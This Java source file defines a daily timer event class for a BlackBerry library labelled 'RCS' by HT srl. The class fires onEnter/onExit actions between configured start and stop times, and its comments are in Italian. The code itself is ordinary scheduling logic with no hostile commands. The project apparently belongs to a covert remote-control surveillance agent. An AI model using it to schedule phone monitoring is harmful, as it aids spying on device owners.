//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : TimerEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.util.Calendar;
import java.util.TimeZone;

import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class TimerEvent.
 */
public final class EventTimer extends Event {

    //#ifdef DEBUG
    private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);
    //#endif

    /** The Constant SLEEP_TIME. */
    private static final int SLEEP_TIME = 1000;

    boolean nextDailyIn;

    /** The type. */
    private int type;

    // milliseconds
    private long start, stop;

    private final long oneDayMs = 24 * 3600 * 1000;

    private boolean needExit;

    public boolean parse(final ConfEvent conf) {
        //SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
        try {
            start = conf.getSeconds("ts") * 1000;
            stop = conf.getSeconds("te") * 1000;
        } catch (ConfigurationException e) {
            return false;
        }

        //#ifdef DEBUG
        debug.trace(" type: " + type + " ts:" + start + " te:" + stop);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
        //#endif

        needExit = false;

        return true;
    }

    public void actualStart() {

        nextDailyIn = setDailyDelay();
        if (!nextDailyIn) {
            // siamo dentro
            onEnter();
            needExit = true;
        }

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualLoop() {
        //#ifdef DEBUG
        debug.trace(" Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        if (nextDailyIn) {
            //#ifdef DEBUG
            debug.trace(" (go): DAILY TIMER: action enter"); //$NON-NLS-1$
            //#endif
            onEnter();
            needExit = true;
        } else {
            //#ifdef DEBUG
            debug.trace(" (go): DAILY TIMER: action exit"); //$NON-NLS-1$
            //#endif
            onExit();
            needExit = false;
        }

        //#ifdef DEBUG
        debug.trace(" (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
        //#endif
        nextDailyIn = setDailyDelay();
        //#ifdef DEBUG
        debug.trace(" (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
        //#endif
    }

    public void actualStop() {
        if (needExit) {
            onExit(); // di sicurezza
        }
    }

    private boolean setDailyDelay() {
        Calendar nowCalendar = Calendar
                .getInstance(TimeZone.getTimeZone("GMT"));

        long nextStart, nextStop;

        int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600)
                + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
                .get(Calendar.SECOND)) * 1000;

        // Estriamo il prossimo evento e determiniamo il delay sulla base del
        // tipo
        if (now < start)
            nextStart = start;
        else
            nextStart = start + (3600 * 24 * 1000); // 1 Day

        if (now < stop)
            nextStop = stop;
        else
            nextStop = stop + (3600 * 24 * 1000); // 1 Day

        boolean ret;
        // stabilisce quale sara' il prossimo evento.
        if (nextStart < nextStop) {
            //#ifdef DEBUG
            debug.trace(" (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
            //#endif

            setDelay(nextStart - now);
            reschedule();

            ret = true;
        } else {
            //#ifdef DEBUG
            debug.trace(" (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
            //#endif

            long delay = nextStop - now;

            setDelay(nextStop - now);
            reschedule();

            ret = false;
        }

        return ret;
    }

}
